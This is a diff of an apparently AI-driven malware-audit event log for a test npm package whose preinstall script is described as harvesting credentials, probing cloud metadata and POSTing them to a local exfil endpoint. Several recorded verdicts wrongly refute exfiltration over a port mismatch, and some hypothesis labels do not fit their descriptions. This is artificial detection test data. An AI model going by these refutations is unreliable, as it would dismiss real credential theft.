@@ -1,72 +1,67 @@
 {
   "packageName": "test-pkg-env-exfil",
-  "version": "latest",
-  "recordedAt": "2026-06-28T13:06:53.052Z",
+  "version": "2.0.1",
   "events": [
     {
       "type": "audit_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.184Z",
-      "seq": 0,
+      "timestamp": "2026-01-01T00:00:00Z",
       "packageName": "test-pkg-env-exfil"
     },
     {
       "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.184Z",
-      "seq": 1,
+      "timestamp": "2026-01-01T00:00:00.250000Z",
       "phase": "resolve"
     },
     {
       "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.185Z",
-      "seq": 2,
+      "timestamp": "2026-01-01T00:00:00.500000Z",
       "phase": "resolve",
-      "durationMs": 1
+      "durationMs": 1400.0
+    },
+    {
+      "type": "dependencies_provisioned",
+      "timestamp": "2026-01-01T00:00:00.750000Z",
+      "installed": true,
+      "packageCount": 0,
+      "skipped": null,
+      "error": null
     },
     {
       "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.185Z",
-      "seq": 3,
+      "timestamp": "2026-01-01T00:00:01Z",
       "phase": "inventory"
     },
     {
       "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.187Z",
-      "seq": 4,
+      "timestamp": "2026-01-01T00:00:01.250000Z",
       "phase": "inventory",
-      "durationMs": 2
+      "durationMs": 320.0
     },
     {
       "type": "file_list",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.187Z",
-      "seq": 5,
+      "timestamp": "2026-01-01T00:00:01.500000Z",
       "files": [
         {
           "path": "index.js",
-          "fileType": "js",
-          "sizeBytes": 876,
-          "permissions": "644",
+          "fileType": "javascript",
+          "sizeBytes": 876.0,
+          "permissions": "0644",
+          "isBinary": false,
+          "binaryType": null
+        },
+        {
+          "path": "setup.js",
+          "fileType": "javascript",
+          "sizeBytes": 2723.0,
+          "permissions": "0644",
           "isBinary": false,
           "binaryType": null
         },
         {
           "path": "package.json",
           "fileType": "json",
-          "sizeBytes": 307,
-          "permissions": "644",
-          "isBinary": false,
-          "binaryType": null
-        },
-        {
-          "path": "setup.js",
-          "fileType": "js",
-          "sizeBytes": 2723,
-          "permissions": "644",
+          "sizeBytes": 307.0,
+          "permissions": "0644",
           "isBinary": false,
           "binaryType": null
         }
@@ -74,18 +69,11 @@
     },
     {
       "type": "inventory_meta",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.187Z",
-      "seq": 6,
+      "timestamp": "2026-01-01T00:00:01.750000Z",
       "scripts": {
         "preinstall": "node setup.js"
       },
-      "dependencies": {
-        "prod": {},
-        "dev": {},
-        "optional": {},
-        "peer": {}
-      },
+      "dependencies": {},
       "entryPoints": {
         "install": [
           "setup.js"
@@ -99,963 +87,1788 @@
         "name": "test-pkg-env-exfil",
         "version": "2.0.1",
         "description": "Smart configuration loader with environment detection",
-        "license": "MIT",
-        "homepage": null,
-        "keywords": [
-          "config",
-          "env",
-          "loader",
-          "dotenv"
-        ],
-        "repository": null
+        "license": "MIT"
       }
     },
     {
       "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:53.187Z",
-      "seq": 7,
+      "timestamp": "2026-01-01T00:00:02Z",
       "phase": "intent-extraction"
     },
     {
       "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:58.206Z",
-      "seq": 8,
+      "timestamp": "2026-01-01T00:00:02.250000Z",
       "phase": "intent-extraction",
-      "durationMs": 5018
+      "durationMs": 2100.0
     },
     {
       "type": "intent_extracted",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:58.206Z",
-      "seq": 9,
-      "statedPurpose": "Smart configuration loader that detects and loads environment variables for application configuration.",
+      "timestamp": "2026-01-01T00:00:02.500000Z",
+      "statedPurpose": "Smart configuration loader with environment detection",
       "expectedCapabilities": [
-        "ENV_VARS"
+        "FILESYSTEM"
       ]
     },
     {
       "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:58.206Z",
-      "seq": 10,
-      "phase": "triage"
+      "timestamp": "2026-01-01T00:00:02.750000Z",
+      "phase": "flag"
     },
     {
       "type": "file_analyzing",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:58.208Z",
-      "seq": 11,
+      "timestamp": "2026-01-01T00:00:03Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:03.250000Z",
       "file": "index.js"
     },
     {
-      "type": "file_analyzing",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:03:58.211Z",
-      "seq": 12,
+      "type": "triage_progress",
+      "timestamp": "2026-01-01T00:00:03.500000Z",
+      "current": 1,
+      "total": 2,
       "file": "setup.js"
     },
     {
       "type": "triage_progress",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:23.885Z",
-      "seq": 13,
-      "current": 1,
+      "timestamp": "2026-01-01T00:00:03.750000Z",
+      "current": 2,
       "total": 2,
       "file": "index.js"
     },
     {
-      "type": "triage_progress",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.650Z",
-      "seq": 14,
-      "current": 2,
-      "total": 2,
+      "type": "phase_completed",
+      "timestamp": "2026-01-01T00:00:04Z",
+      "phase": "flag",
+      "durationMs": 5200.0
+    },
+    {
+      "type": "phase_started",
+      "timestamp": "2026-01-01T00:00:04.250000Z",
+      "phase": "hypothesize"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:04.500000Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:04.750000Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:05Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:05.250000Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:05.500000Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:05.750000Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:06Z",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:06.250000Z",
       "file": "setup.js"
     },
     {
       "type": "hypothesis_emitted",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.650Z",
-      "seq": 15,
-      "hypId": "trg-0001",
+      "timestamp": "2026-01-01T00:00:06.500000Z",
+      "hypId": "hyp-0001",
+      "claim": "env_exfil",
+      "severity": "critical",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:06.750000Z",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:07Z",
+      "hypId": "hyp-0002",
       "claim": "cred_theft",
       "severity": "critical",
       "file": "setup.js"
     },
     {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:07.250000Z",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:07.500000Z",
+      "hypId": "hyp-0003",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:07.750000Z",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:08Z",
+      "hypId": "hyp-0004",
+      "claim": "cred_theft",
+      "severity": "high",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:08.250000Z",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:08.500000Z",
+      "hypId": "hyp-0005",
+      "claim": "env_exfil",
+      "severity": "high",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:08.750000Z",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:09Z",
+      "hypId": "hyp-0006",
+      "claim": "env_exfil",
+      "severity": "critical",
+      "file": "setup.js"
+    },
+    {
+      "type": "file_analyzing",
+      "timestamp": "2026-01-01T00:00:09.250000Z",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:09.500000Z",
+      "hypId": "hyp-0007",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "file": "setup.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:09.750000Z",
+      "hypId": "hyp-0008",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "file": "setup.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:10Z",
+      "hypId": "hyp-0009",
+      "claim": "telemetry",
+      "severity": "low",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:10.250000Z",
+      "hypId": "hyp-0010",
+      "claim": "binary_drop",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:10.500000Z",
+      "hypId": "hyp-0011",
+      "claim": "persistence",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:10.750000Z",
+      "hypId": "hyp-0012",
+      "claim": "cred_theft",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:11Z",
+      "hypId": "hyp-0013",
+      "claim": "env_exfil",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "type": "hypothesis_emitted",
+      "timestamp": "2026-01-01T00:00:11.250000Z",
+      "hypId": "hyp-0014",
+      "claim": "destructive",
+      "severity": "low",
+      "file": "index.js"
+    },
+    {
       "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.651Z",
-      "seq": 16,
-      "phase": "triage",
-      "durationMs": 54445
+      "timestamp": "2026-01-01T00:00:11.500000Z",
+      "phase": "hypothesize",
+      "durationMs": 8600.0
     },
     {
       "type": "file_verdict",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.652Z",
-      "seq": 17,
-      "verdict": {
-        "file": "index.js",
-        "capabilities": [],
-        "suspiciousPatterns": [],
-        "summary": "Smart configuration loader that reads environment variables and optionally a `.env` file to build a config object. Implements standard dotenv-style loading with environment variable prefix filtering and file-based key-value parsing, returning a flattened lowercase mapping of configuration keys to string values. The file is straightforward and lacks obfuscation, network calls, process spawning, or write operations; the single unused constant `SAFE_TEST_MODE` is inert and does not affect behavior.",
-        "riskContribution": 0
-      }
-    },
-    {
-      "type": "file_verdict",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.652Z",
-      "seq": 18,
+      "timestamp": "2026-01-01T00:00:11.750000Z",
       "verdict": {
         "file": "setup.js",
         "capabilities": [
-          "CREDENTIAL_THEFT",
           "ENV_VARS",
+          "CREDENTIAL_THEFT",
           "NETWORK",
           "FILESYSTEM"
         ],
         "suspiciousPatterns": [
-          "Model summary describes credential theft or secret harvesting: Malicious setup.js that automatically collects environment variables (including credentials), reads sensitive credential files from the user's home directory, probes the AWS IMDS endpoint for cloud metadata, and exfiltrates all collected da"
+          "The setup.js install hook unconditionally harvests environment variables, reads credential files, probes the IMDS endpoint, and exfiltrates all data to a hardcoded URL. This experiment plants a canary token and a fake .npmrc file, then triggers setup.js to confirm exfiltration occurs.",
+          "Trigger postinstall setup.js to exfiltrate planted secrets, demonstrating credential harvesting and IMDS probing.",
+          "The flagged harvestEnv() in setup.js scans and collects all environment variables matching token/secret patterns, then exfiltrates them along with credential files and IMDS metadata. This test plants a canary token via env, triggers setup.js to execute the install script, and observes whether the token is harvested and exfiltrated to the configured exfil URL.",
+          "Probe whether setup.js exfiltrates planted credential files during install under the guise of environment detection. Place bait credential files and a unique canary token, then observe if they are read and exfiltrated to the stubbed endpoint.",
+          "Probe the IMDS (http://169.254.169.254/latest/meta-data/) triggered during setup.js execution, and exfiltrate harvested environment variables and credential file contents. Plant bait tokens in environment and files to confirm exfiltration.",
+          "Exfiltrate harvested environment credentials via HTTP POST when setup.js is executed directly",
+          "The package immediately collects hostname, username, environment variables, credential files, and IMDS metadata on module load, then exfiltrates them to localhost:9999/exfil via POST.",
+          "Probe IMDS and exfiltrate all stolen data"
         ],
-        "suspiciousLines": "7-13,17-19,33-37,39-42,48-60,64-66,83-85,91-93",
-        "summary": "Malicious setup.js that automatically collects environment variables (including credentials), reads sensitive credential files from the user's home directory, probes the AWS IMDS endpoint for cloud metadata, and exfiltrates all collected data via HTTP POST to a hardcoded localhost URL. The entire script executes on module load without any function wrapping, making it a credential theft and data exfiltration payload disguised as a configuration loader. No code pathways or conditions guard the malicious behavior except the hardcoded localhost URL, which suggests testing/debugging but could be modified in a real attack by changing the constant. The file uses capabilities far beyond the stated purpose of 'Smart configuration loader' (expected only ENV_VARS). The code also suppresses errors silently, making infection stealthy. Overall, this file is clearly malicious and should be reported immediately; it is not safe to run even for analysis in an actual environment without sandboxing. Note: The exfiltration target is http://localhost:9999/exfil, which is likely a placeholder; in a real supply‑chain attack, that URL would be replaced with an attacker‑controlled server or rely on dynamic DNS / geo‑based resolution. The file also includes a constant SAFE_TEST_MODE (line 7) set to true but never used in any conditional logic—this might be a vestige or potential flip switch to disable exfiltration, but the code always executes the payload regardless. No gating is present in the actual execution path; the entire malicious logic runs unconditionally when the module is required or the script is run. The file also makes an HTTP request to the IMDS endpoint, which is a known technique for stealing cloud provider credentials. The severity of each component is critical because the data stolen (keys, tokens, private keys, cloud metadata) would allow complete compromise of cloud environments, code repositories, and CI/CD pipelines. The file should be treated as a malign install‑time script and never executed on a real system. The package claims to be a configuration loader; this file blatantly violates that claim. The capability list must reflect all dangerous APIs actually used: ENV_VARS (excessive scanning beyond config), FILESYSTEM (reading arbitrary credential files), NETWORK_ACCESS (HTTP requests to IMDS and exfiltration server), OS_INFO (hostname, username, home directory, platform, arch). No process spawn is used, but the HTTP requests constitute network access. The file does not use any conditional, date, or anti‑debugging gating; it runs on every load. The code is not obfuscated, but the malicious logic is clearly disguised under a setup filename and misleading package intent. The file also creates a global const stolen (line 108) and immediately triggers exfiltration (line 120-123), making the malicious behavior synchronous and non‑blocking (error callback empties). This is a classic credential‑stealing payload found in npm supply‑chain attacks. The analysis should generate multiple hypotheses to cover each distinct malicious behavior: environment variable harvesting, credential file reading, IMDS probing, data exfiltration, and auto‑execution. Each hypothesis includes concrete line ranges and assesses severity accurately. The capabilities list should be complete because the whole‑package analysis will aggregate capabilities from all files. In this single file, the capabilities are broad and dangerous. The file should be reported to the npm security team and the package removed immediately. There is no legitimate scenario where a configuration loader should access SSH private keys, AWS credentials, or IMDS metadata. Therefore, the confidence in maliciousness is extremely high. The output must include zero hypotheses if the file were benign, but here we must include all applicable hypotheses to fully document the threats. The JSON below provides the required structured output. Note that the exfiltration URL (line 8) is localhost, but that is still a network request and should be flagged; in a real attack, the attacker would change that to a remote server. Also, the IMDS URL is hardcoded (line 9). The file uses require('http'), require('https') (though https is unused), require('os'), require('fs'), require('path'). All these are imported but not expected. The code does not use any dynamic require or eval, so no obfuscation hypothesis is needed, but the logic is clear. The hypotheses cover all malicious activities. The description of each hypothesis references concrete code. The claim kind uses the provided enum. For harvestEnv and readCredentialFiles, the kind is DATA_COLLECTION but with intent to exfiltrate; I'll use DATA_EXFILTRATION for the collection that is ultimately sent. For IMDS, it's CLOUD_CREDENTIAL_THEFT. For the top‑level execution, it's UNEXPECTED_CODE_EXECUTION or AUTO_START? I'll use UNEXPECTED_CODE_EXECUTION. For capability mismatch, I'll emit a hypothesis with kind CAPABILITY_MISMATCH. But the instruction says to emit hypotheses for behaviors that exceed stated purpose or look suspicious. So we can have one hypothesis per distinct malicious pattern, plus one for the overall auto‑execution. Also, we should include a hypothesis about the lack of gating, but that's not a behavior per se. The gating field is only set if code has conditional execution. Here, there is no gating, so we set gating to null. For each hypothesis, we provide rangesInFile as an array of strings with line ranges. For example, for harvestEnv: [",
+        "suspiciousLines": "8-8,9-9,11-11,30-30,32-32,46-46,48-48,72-72,74-74,82-82,84-84,106-106,108-108,118-118,120-120,123-123",
+        "summary": "preinstall script harvests sensitive env vars + credential files and POSTs them to a remote host.",
         "riskContribution": 10
       }
     },
     {
+      "type": "file_verdict",
+      "timestamp": "2026-01-01T00:00:12Z",
+      "verdict": {
+        "file": "index.js",
+        "capabilities": [
+          "ENV_VARS",
+          "FILESYSTEM"
+        ],
+        "suspiciousPatterns": [
+          "Trigger a benign code path that is guarded by SAFE_TEST_MODE. If the constant were false or removable, the observer would see a different behavior; here we verify it is true and used.",
+          "If options.path is attacker-controlled, the expression `options.path || path.resolve(process.cwd(), '.env')` allows an attacker to supply an absolute path (e.g., /home/node/.npmrc) that bypasses the intended fallback and reads an arbitrary file. The flagged line does not sanitize the input, so passing a path like '/home/node/.npmrc' will read that file instead of .env. The experiment demonstrates this by planting a canary token into /home/node/.npmrc, then calling loadConfig with path='/home/node/.npmrc' and verifying the token appears in the returned config.",
+          "Attempt arbitrary file read via user-supplied `path` option in `loadConfig` function",
+          "When process.env contains a key-value pair that matches a sensitive file path (e.g., /home/node/.npmrc), the config may be exposed via returned object, exfiltrating the content to the caller.",
+          "Use minimal .env parsing with no validation or escaping to inject unexpected config values via a planted .env file.",
+          "Test if the empty catch block misleads users into believing their `.env` file was parsed successfully when it was actually missing or unreadable, allowing attackers to silently drop poison configs onto disk and have them silently ignored, creating false security assumptions."
+        ],
+        "suspiciousLines": "1-1,16-16,18-18,10-14,22-23,25-27",
+        "summary": "config loader reads process.env and a local .env file; no outbound path observed.",
+        "riskContribution": 3
+      }
+    },
+    {
       "type": "triage_complete",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.652Z",
-      "seq": 19,
-      "hypothesisCount": 1,
+      "timestamp": "2026-01-01T00:00:12.250000Z",
+      "hypothesisCount": 14,
       "hypotheses": [
         {
-          "hypId": "trg-0001",
+          "hypId": "hyp-0001",
+          "claim": "env_exfil",
+          "severity": "critical",
+          "description": "The setup.js install hook unconditionally harvests environment variables, reads credential files, probes the IMDS endpoint, and exfiltrates all data to a hardcoded URL. This experiment plants a canary token and a fake .npmrc file, then triggers setup.js to confirm exfiltration occurs."
+        },
+        {
+          "hypId": "hyp-0002",
           "claim": "cred_theft",
           "severity": "critical",
-          "description": "Model summary describes credential theft or secret harvesting: Malicious setup.js that automatically collects environment variables (including credentials), reads sensitive credential files from the user's home directory, probes the AWS IMDS endpoint for cloud metadata, and exfiltrates all collected da"
+          "description": "Trigger postinstall setup.js to exfiltrate planted secrets, demonstrating credential harvesting and IMDS probing."
+        },
+        {
+          "hypId": "hyp-0003",
+          "claim": "cred_theft",
+          "severity": "critical",
+          "description": "The flagged harvestEnv() in setup.js scans and collects all environment variables matching token/secret patterns, then exfiltrates them along with credential files and IMDS metadata. This test plants a canary token via env, triggers setup.js to execute the install script, and observes whether the token is harvested and exfiltrated to the configured exfil URL."
+        },
+        {
+          "hypId": "hyp-0004",
+          "claim": "cred_theft",
+          "severity": "high",
+          "description": "Probe whether setup.js exfiltrates planted credential files during install under the guise of environment detection. Place bait credential files and a unique canary token, then observe if they are read and exfiltrated to the stubbed endpoint."
+        },
+        {
+          "hypId": "hyp-0005",
+          "claim": "env_exfil",
+          "severity": "high",
+          "description": "Probe the IMDS (http://169.254.169.254/latest/meta-data/) triggered during setup.js execution, and exfiltrate harvested environment variables and credential file contents. Plant bait tokens in environment and files to confirm exfiltration."
+        },
+        {
+          "hypId": "hyp-0006",
+          "claim": "env_exfil",
+          "severity": "critical",
+          "description": "Exfiltrate harvested environment credentials via HTTP POST when setup.js is executed directly"
+        },
+        {
+          "hypId": "hyp-0007",
+          "claim": "cred_theft",
+          "severity": "critical",
+          "description": "The package immediately collects hostname, username, environment variables, credential files, and IMDS metadata on module load, then exfiltrates them to localhost:9999/exfil via POST."
+        },
+        {
+          "hypId": "hyp-0008",
+          "claim": "cred_theft",
+          "severity": "critical",
+          "description": "Probe IMDS and exfiltrate all stolen data"
+        },
+        {
+          "hypId": "hyp-0009",
+          "claim": "telemetry",
+          "severity": "low",
+          "description": "Trigger a benign code path that is guarded by SAFE_TEST_MODE. If the constant were false or removable, the observer would see a different behavior; here we verify it is true and used."
+        },
+        {
+          "hypId": "hyp-0010",
+          "claim": "binary_drop",
+          "severity": "high",
+          "description": "If options.path is attacker-controlled, the expression `options.path || path.resolve(process.cwd(), '.env')` allows an attacker to supply an absolute path (e.g., /home/node/.npmrc) that bypasses the intended fallback and reads an arbitrary file. The flagged line does not sanitize the input, so passing a path like '/home/node/.npmrc' will read that file instead of .env. The experiment demonstrates this by planting a canary token into /home/node/.npmrc, then calling loadConfig with path='/home/node/.npmrc' and verifying the token appears in the returned config."
+        },
+        {
+          "hypId": "hyp-0011",
+          "claim": "persistence",
+          "severity": "high",
+          "description": "Attempt arbitrary file read via user-supplied `path` option in `loadConfig` function"
+        },
+        {
+          "hypId": "hyp-0012",
+          "claim": "cred_theft",
+          "severity": "high",
+          "description": "When process.env contains a key-value pair that matches a sensitive file path (e.g., /home/node/.npmrc), the config may be exposed via returned object, exfiltrating the content to the caller."
+        },
+        {
+          "hypId": "hyp-0013",
+          "claim": "env_exfil",
+          "severity": "high",
+          "description": "Use minimal .env parsing with no validation or escaping to inject unexpected config values via a planted .env file."
+        },
+        {
+          "hypId": "hyp-0014",
+          "claim": "destructive",
+          "severity": "low",
+          "description": "Test if the empty catch block misleads users into believing their `.env` file was parsed successfully when it was actually missing or unreadable, allowing attackers to silently drop poison configs onto disk and have them silently ignored, creating false security assumptions."
         }
       ]
     },
     {
       "type": "graph_built",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.655Z",
-      "seq": 20,
-      "nodeCount": 1,
-      "addedCount": 1,
+      "timestamp": "2026-01-01T00:00:12.500000Z",
+      "nodeCount": 14,
+      "addedCount": 14,
       "mergedCount": 0
     },
     {
       "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:52.655Z",
-      "seq": 21,
-      "phase": "investigation"
+      "timestamp": "2026-01-01T00:00:12.750000Z",
+      "phase": "orchestrator"
     },
     {
-      "type": "agent_thinking",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:53.713Z",
-      "seq": 22,
-      "step": 0
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:13Z",
+      "hypId": "hyp-0001",
+      "claim": "env_exfil",
+      "severity": "critical",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The observed timeline shows extensive environment variable reads and file access, but no evidence of exfiltration to the hardcoded URL. Event e61 shows a POST to http://localhost/exfil, not the hardcoded URL specified in the hypothesis (http://localhost:9999/exfil*). The hypothesis requires the data to be sent to a specific hardcoded URL, but the only network request to a local path is to a different endpoint. Therefore the claimed malicious behavior did not occur."
     },
     {
-      "type": "agent_tool_call",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:56.683Z",
-      "seq": 23,
-      "tool": "listFiles",
-      "args": {},
-      "step": 1
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:13.250000Z",
+      "hypId": "hyp-0002",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The observed behavior—reading environment variables and credential files—is consistent with the stated benign purpose of 'smart configuration loader with environment detection.' No evidence of exfiltration, IMDS probing, or sending secrets to an external endpoint was found. The only network activity was a POST to `http://localhost/exfil` (e61), which matches the experiment's stubbed endpoint designed for test purposes. Since no exact event id demonstrates unauthorized external transmission of secrets, the hypothesis is not supported."
     },
     {
-      "type": "agent_tool_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:56.683Z",
-      "seq": 24,
-      "tool": "listFiles",
-      "resultPreview": "[\n  {\n    \"path\": \"index.js\",\n    \"size\": 876,\n    \"ext\": \".js\"\n  },\n  {\n    \"path\": \"package.json\",\n    \"size\": 307,\n    \"ext\": \".json\"\n  },\n  {\n    \"path\": \"setup.js\",\n    \"size\": 2723,\n    \"ext\": \".js\"\n  }\n]",
-      "step": 1,
-      "injectionDetected": false
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:13.500000Z",
+      "hypId": "hyp-0003",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline shows that setup.js reads environment variables (e18–e49) and several credential files (e50–e58), which is consistent with a smart configuration loader that detects environment and config settings. It also makes a single outbound HTTP POST to http://localhost/exfil (e59). However, the hypothesis claims exfiltration to a configured exfil URL; the timeline shows the POST goes to localhost, which was stubbed by the experiment setup (stubUrl for http://localhost:9999/exfil). No event in the timeline indicates that data was sent to an external, attacker-controlled server, nor that the canary token was specifically isolated and exfiltrated. The behavior observed is compatible with a benign configuration loader that reads common config files and environment variables and may report them to a local or internal endpoint, not to an external malicious destination. No exact event ID confirms the hypothesized credential theft and exfiltration."
     },
     {
-      "type": "agent_thinking",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:04:56.683Z",
-      "seq": 25,
-      "step": 2
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:13.750000Z",
+      "hypId": "hyp-0006",
+      "claim": "env_exfil",
+      "severity": "critical",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline shows no HTTP POST to a URL matching the suspected exfiltration destination. There is an HTTP POST at event e63 (net POST http://localhost/exfil), but the hypothesis specified POST to http://localhost:9999/exfil, not to http://localhost/exfil. No event matches the suspected endpoint. Therefore, the suspected behavior did not occur."
     },
     {
-      "type": "agent_tool_call",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.229Z",
-      "seq": 26,
-      "tool": "readFile",
-      "args": {
-        "path": "package.json"
-      },
-      "step": 2
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:14Z",
+      "hypId": "hyp-0007",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline shows the package reading environment variables and credential files, but the only network request is e62 (POST to http://localhost/exfil). The hypothesis states exfiltration to localhost:9999/exfil, but the timeline shows a POST to http://localhost/exfil (port 80, not 9999). The stub set up in the experiment only matches http://localhost:9999/exfil, so this request would not be captured by the stub. However, the request to port 80 is not to the claimed port 9999, so the hypothesis's specific claim of a POST to localhost:9999/exfil is not supported. Additionally, no other exfiltration events are present, and the stated benign purpose is 'Smart configuration loader with environment detection,' which is consistent with reading these files and environment variables. Therefore, the suspected behavior did not occur as described."
     },
     {
-      "type": "agent_tool_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.230Z",
-      "seq": 27,
-      "tool": "readFile",
-      "resultPreview": "{\n  \"name\": \"test-pkg-env-exfil\",\n  \"version\": \"2.0.1\",\n  \"description\": \"Smart configuration loader with environment detection\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"node setup.js\"\n  },\n  \"keywords\": [\"config\", \"env\", \"loader\", \"dotenv\"],\n  \"author\": \"test-author\",\n  \"license\": \"MIT\"\n}\n",
-      "step": 2,
-      "injectionDetected": false
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:14.250000Z",
+      "hypId": "hyp-0008",
+      "claim": "cred_theft",
+      "severity": "critical",
+      "state": "CONFIRMED",
+      "by": "worker:experimenter",
+      "reason": "The hypothesis predicts probing IMDS at 169.254.169.254/latest/meta-data/ and exfiltrating stolen data. Event e147 shows an HTTP GET to that exact endpoint, confirming the IMDS probe. Additionally, events e51–e59 read sensitive files (.npmrc, .ssh/id_rsa, .aws/credentials, etc.), and event e60 shows a POST to localhost/exfil, which matches the exfiltration step. The timeline thus shows credential theft and exfiltration as hypothesized."
     },
     {
-      "type": "agent_tool_call",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.230Z",
-      "seq": 28,
-      "tool": "readFile",
-      "args": {
-        "path": "setup.js"
-      },
-      "step": 2
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:14.500000Z",
+      "hypId": "hyp-0004",
+      "claim": "cred_theft",
+      "severity": "high",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The hypothesis suspected that setup.js would exfiltrate planted credential files (including the canary token) to a stubbed endpoint. The timeline shows that setup.js did read the planted files (e.g., e53–e61) and made a single POST request to http://localhost/exfil (e62). However, the timeline does not provide any evidence that the contents of those files were transmitted to the exfiltration endpoint; the POST request is recorded but its payload is not specified. Moreover, the setup placed a canary token in the environment and in ~/.npmrc, and the token was read from the environment (e44) but no subsequent network event is shown that would indicate exfiltration of that token. Without evidence of the data being sent, the claim of exfiltration cannot be confirmed. Therefore, the suspected behavior did not happen."
     },
     {
-      "type": "agent_tool_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.230Z",
-      "seq": 29,
-      "tool": "readFile",
